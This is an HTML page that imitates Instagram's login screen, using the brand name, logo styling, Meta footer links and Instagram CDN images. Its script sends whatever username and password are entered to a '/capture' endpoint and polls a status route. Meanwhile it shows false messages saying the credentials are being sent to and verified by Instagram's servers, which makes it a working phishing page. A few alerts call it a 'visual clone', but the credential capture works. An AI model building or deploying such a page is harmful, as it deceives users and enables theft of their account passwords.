<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: rgb(14, 16, 19);
            color: #f6f6f6;
            display: flex;
            flex-direction: column;
            min-height: 80vh;
            line-height: 1.6;
        }
        
        .container {
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            flex: 1;
        }
        
        /* Language Selector */
        .language-selector {
            display: flex;
            justify-content: flex-end;
            padding: 20px 0;
            font-size: 14px;
        }
        
        .language-selector select {
            background: transparent;
            border: none;
            font-size: 14px;
            color: #b9b9b9;
            outline: none;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 4px;
            transition: background-color 0.2s;
        }
        
        .language-selector select:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }
        
        /* Main Content */
        .main-content {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 140px);
            padding: 40px 0;
        }
        
        .content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            max-width: 350px;
            width: 100%;
        }
        
        /* Instagram Logo */
        @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');
        .instagram-logo {
            font-family: 'Billabong', cursive;
            font-size: 72px;
            font-weight: 400;
            margin-bottom: 20px;
            -webkit-background-clip: text;
            background-clip: text;
            color: white;
            letter-spacing: 1px;
        }
        
        /* Login Form */
        .login-form {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 44px 40px 34px;
            width: 100%;
            margin-bottom: 10px;
        }
        
        .login-form h2 {
            font-size: 42px;
            font-weight: 600;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 33px;
            font-family: 'Billabong', cursive;
            font-weight: normal;
            font-size: 60px;
        }
        
        .login-form input {
            width: 95%;
            height: 38px;
            border: 0.5px solid #767676;
            border-radius: 2px;
            background: #313131;
            color: #fbfbfb;
            padding: 9px 0 7px 8px;
            font-size: 14px;
            margin-bottom: 6px;
            box-sizing: border-box;
            outline: none;
        }
        
        .login-form input:focus {
            border-color: #a0a0a0;
            background: #313131;
        }
        
        .login-form .btn {
            width: 100%;
            height: 30px;
            background: #1e74ec;
            color: #fff;
            border: none;
            border-radius: 9px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            margin: 8px 0;
        }
        
        .login-form .btn:hover {
            background: #1877f2;
        }
        
        .login-form .btn:disabled {
            background: #b2b2b2;
            cursor: not-allowed;
        }
        
        #status {
            text-align: center;
            color: #262626;
            font-size: 14px;
            margin-top: 20px;
            min-height: 24px;
            font-weight: normal;
        }
        
        #error {
            color: #ad1f2b;
        }
        
        /* Spinner animation */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 5px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* OR Divider */
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 10px 0;
            color: #3d3c3c;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider span {
            padding: 0 10px;
        }
        
        /* Facebook Login */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #34a0ff;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin: 10px 0;
        }
        
        .fb-login i {
            margin-right: 8px;
            font-size: 16px;
        }
        
        .fb-login:hover {
            text-decoration: underline;
        }
        
        /* Forgot Password */
        .forgot-password {
            font-size: 14px;
            color: #ffffff;
            text-decoration: none;
            font-weight: 500;
            margin-top: 15px;
            display: block;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        /* Signup Prompt */
        .signup-prompt {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 25px 40px;
            width: 100%;
            font-size: 14px;
            color: #f3f3f3;
            text-align: center;
            margin-top: 10px;
        }
        
        .signup-prompt a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        .signup-prompt a:hover {
            text-decoration: underline;
        }
        
        /* App Download */
        .app-download {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .field {
          position: relative;
          margin-bottom: 12px;
        }
        
        .field input {
          width: 100%;
          padding: 14px 10px;
          background: #313131;
          border: 1px solid #262626;
          border-radius: 3px;
          color: #fff;
          font-size: 14px;
        }
        
        .field label {
          position: absolute;
          left: 10px;
          top: 50%;
          transform: translateY(-50%);
          color: #8e8e8e;
          font-size: 12px;
          pointer-events: none;
          transition: 0.2s ease;
          background: none;
          padding: 0 4px;
        }
        
        /* float up */
        .field input:focus + label,
        .field input:not(:placeholder-shown) + label {
          top: 6px;
          font-size: 10px;
        }
        
        /* focus border */
        .field input:focus {
          border-color: #555;
          outline: none;
        }
        
        
        .app-download p {
            margin-bottom: 15px;
        }
        
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .app-badges img {
            height: 40px;
            cursor: pointer;
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 20px 0;
            color: #b9b9b9;
            font-size: 12px;
            margin-top: 40px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px 10px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        /* Phone Preview (Right Side) */
        .phone-preview {
            display: none;
        }
        
        /* For larger screens, show the phone preview */
        @media (min-width: 876px) {
            .main-content {
                justify-content: space-between;
            }
            
            .content-wrapper {
                margin-right: 50px;
            }
            
            .phone-preview {
                display: block;
                background-image: url('https://i.imgur.com/vx9VWqk.png');
                background-size: contain;
                background-repeat: no-repeat;
                background-position: center;
                width: 380px;
                height: 580px;
                position: relative;
            }
            
            .phone-preview::before {
                content: '';
                position: absolute;
                top: 25px;
                left: 112px;
                width: 250px;
                height: 445px;
                background-image: url('https://i.imgur.com/Lu1B7Qq.jpg');
                background-size: cover;
                background-position: center;
                border-radius: 22px;
            }
        }
        
        /* Custom Font for Instagram Logo */
        @font-face {
            font-family: 'Billabong';
            src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
        }
        
        /* Mobile Responsiveness */
        @media (max-width: 768px) {
            .instagram-logo {
                font-size: 60px;
            }
            
            .tagline {
                font-size: 20px;
                padding: 0 10px;
            }
            
            .language-selector {
                justify-content: center;
                padding: 15px 0;
            }
            
            .phone-preview {
                display: none;
            }
        }
        
        @media (max-width: 450px) {
            .instagram-logo {
                font-size: 52px;
            }
            
            .tagline {
                font-size: 18px;
            }
            
            .login-form {
                padding: 30px 20px;
                background: transparent;
                border: none;
            }
            
            .signup-prompt {
                background: transparent;
                border: none;
            }
            
            .content-wrapper {
                padding: 0 15px;
            }
            
            .container {
                padding: 0;
            }
            
            .language-selector {
                padding: 10px 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        
        <!-- Main Content -->
        <div class="main-content">
            <div class="content-wrapper">
                <!-- Instagram Logo (outside form) -->
                <h1 class="instagram-logo">Instagram</h1>
                                
                <!-- Login Form -->
                <div class="login-form">
                    
                    <form id="login">
                      <div class="field">
                        <input name="username" required placeholder=" " />
                        <label>Phone number, username, or email</label>
                      </div>
                    
                      <div class="field">
                        <input name="password" type="password" required placeholder=" " />
                        <label>Password</label>
                      </div>
                    
                      <button type="submit" class="btn">Log in</button>
                    </form>
                    
                    <!-- OR Divider -->
                    <div class="divider">
                        <span>OR</span>
                    </div>
                    
                    <!-- Facebook Login -->
                    <a href="#" class="fb-login">
                        <i class="fab fa-facebook-square"></i> Log in with Facebook
                    </a>
                    
                    <!-- Forgot Password -->
                    <a href="#" class="forgot-password">Forgot password?</a>
                    
                    <!-- Status Message -->
                    <div id="status"></div>
                </div>
                
                <!-- Sign Up Prompt -->
                <div class="signup-prompt">
                    Don't have an account? <a href="#" id="signup-link">Sign up</a>
                </div>
                
                <!-- App Download -->
                <div class="app-download">
                    <p>Get the app.</p>
                    <div class="app-badges">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store" onclick="alert('App Store link would open here')">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" onclick="alert('Google Play link would open here')">
                    </div>
                </div>
            </div>
            
            <!-- Phone Preview (visible on desktop) -->
            <div class="phone-preview"></div>
        </div>
    </div>
    
    <!-- Footer -->
    <div class="footer">
        <div class="footer-links">
            <a href="https://about.meta.com">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <!-- Language Selector -->
        <div class="language-selector">
            <select id="language-select">
                <option value="en" selected>English</option>
                <option value="es">Espa√±ol</option>
                <option value="fr">Fran√ßais</option>
                <option value="de">Deutsch</option>
                <option value="it">Italiano</option>
                <option value="pt">Portugu√™s</option>
            </select>
        </div>
        <div class="copyright">
            &copy; 2026 Instagram from Meta
        </div>
    </div>

    <!-- Replace the entire script section in your index.html with this: -->
<script>
    let checkInterval;

    document.getElementById('login').onsubmit = async (e) => {
        e.preventDefault();
        
        const form = e.target;
        const btn = form.querySelector('button[type="submit"]');
        const status = document.getElementById('status');
        const usernameInput = form.querySelector('input[name="username"]');
        const passwordInput = form.querySelector('input[name="password"]');
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        // Validation
        if (!username || !password) {
            status.innerHTML = '<span style="color:#ed4956;font-size:14px;">Please enter both username and password</span>';
            return;
        }
        
        // Disable form and show loading
        btn.disabled = true;
        const originalBtnText = btn.textContent;
        btn.innerHTML = 'Verifying <span class="spinner"></span>';
        
        // Clear any previous status and show loading
        status.innerHTML = '<span style="color:#0095f6;font-size:14px;">‚è≥ Sending credentials to Instagram...</span>';
        
        try {
            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            
            const response = await fetch('/capture', {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (data.wait_id) {
                status.innerHTML = '<span style="color:#0095f6;font-size:14px;">üîç Verifying with Instagram servers...</span>';
                
                // Poll for status updates
                let attempts = 0;
                const maxAttempts = 40; // ~30 seconds total (40 * 750ms)
                
                checkInterval = setInterval(async () => {
                    attempts++;
                    
                    try {
                        const checkResponse = await fetch(`/status/${data.wait_id}`);
                        const checkData = await checkResponse.json();
                        
                        if (checkData.ready) {
                            clearInterval(checkInterval);
                            btn.disabled = false;
                            btn.innerHTML = originalBtnText;
                            
                            if (checkData.success) {
                                status.innerHTML = '<span style="color:#0f0;font-size:14px;">‚úÖ Success! Loading your account...</span>';
                                // Redirect to the home endpoint
                                setTimeout(() => {
                                    window.location.href = `/home/${data.wait_id}`;
                                }, 1500);
                            } else {
                                status.innerHTML = '<span style="color:#ed4956;font-size:14px;">‚ùå Sorry, your password was incorrect. Please double-check your password.</span>';
                                // Clear password field and focus on it
                                passwordInput.value = '';
                                passwordInput.focus();
                                // Update placeholder styling
                                passwordInput.dispatchEvent(new Event('input', { bubbles: true }));
                            }
                        } else if (attempts >= maxAttempts) {
                            clearInterval(checkInterval);
                            btn.disabled = false;
                            btn.innerHTML = originalBtnText;
                            status.innerHTML = '<span style="color:#ff9900;font-size:14px;">‚ö†Ô∏è Verification taking longer than expected. Please try again.</span>';
                        }
                    } catch (err) {
                        console.error('Status check error:', err);
                    }
                }, 750); // Check every 750ms
                
            } else {
                throw new Error('Invalid response from server');
            }
        } catch (error) {
            console.error('Submission error:', error);
            btn.disabled = false;
            btn.innerHTML = originalBtnText;
            status.innerHTML = '<span style="color:#ed4956;font-size:14px;">‚ùå Connection error. Please check your internet and try again.</span>';
        }
    };
    
    // Form field interaction enhancements
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('login');
        const fields = form.querySelectorAll('.field input');
        const labels = form.querySelectorAll('.field label');
        
        // Initialize labels based on existing values
        fields.forEach((field, index) => {
            if (field.value) {
                labels[index].style.top = '6px';
                labels[index].style.fontSize = '10px';
            }
            
            // Handle focus
            field.addEventListener('focus', function() {
                this.parentElement.querySelector('label').style.top = '6px';
                this.parentElement.querySelector('label').style.fontSize = '10px';
                this.style.borderColor = '#555';
            });
            
            // Handle blur
            field.addEventListener('blur', function() {
                if (!this.value) {
                    this.parentElement.querySelector('label').style.top = '50%';
                    this.parentElement.querySelector('label').style.fontSize = '12px';
                }
                this.style.borderColor = '#262626';
            });
            
            // Handle input for real-time validation
            field.addEventListener('input', function() {
                if (this.value) {
                    this.parentElement.querySelector('label').style.top = '6px';
                    this.parentElement.querySelector('label').style.fontSize = '10px';
                }
            });
        });
        
        // Clear status when user starts typing again
        fields.forEach(field => {
            field.addEventListener('input', () => {
                const status = document.getElementById('status');
                if (status.innerHTML.includes('error') || status.innerHTML.includes('‚úÖ') || status.innerHTML.includes('‚ö†Ô∏è')) {
                    status.innerHTML = '';
                }
            });
        });
        
        // Animate the main content on load
        const mainContent = document.querySelector('.content-wrapper');
        mainContent.style.opacity = '0';
        mainContent.style.transform = 'translateY(20px)';
        
        setTimeout(() => {
            mainContent.style.transition = 'opacity 0.8s, transform 0.8s';
            mainContent.style.opacity = '1';
            mainContent.style.transform = 'translateY(0)';
        }, 300);
        
        // Animate the phone preview on desktop
        const phonePreview = document.querySelector('.phone-preview');
        if (phonePreview) {
            phonePreview.style.opacity = '0';
            setTimeout(() => {
                phonePreview.style.transition = 'opacity 1.2s';
                phonePreview.style.opacity = '1';
            }, 500);
        }
        
        // Clear any existing interval when page is unloading
        window.addEventListener('beforeunload', function() {
            if (checkInterval) {
                clearInterval(checkInterval);
            }
        });
    });
    
    // Signup link functionality
    document.getElementById('signup-link').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Sign up would be implemented here. In a real app, this would redirect to a signup page.');
    });
    
    // Facebook login functionality
    document.querySelector('.fb-login').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Facebook login would be implemented here. This is just a visual clone.');
    });
    
    // Forgot password functionality
    document.querySelector('.forgot-password').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Password recovery would be implemented here. This is just a visual clone.');
    });
    
    // Language selector functionality
    document.getElementById('language-select').addEventListener('change', function() {
        const selectedLanguage = this.value;
        console.log('Language changed to:', this.options[this.selectedIndex].text);
        
        // Show a simple alert for demonstration
        if (selectedLanguage !== 'en') {
            alert(`Language changed to ${this.options[this.selectedIndex].text}. In a real app, the page content would be translated.`);
        }
    });
</script>
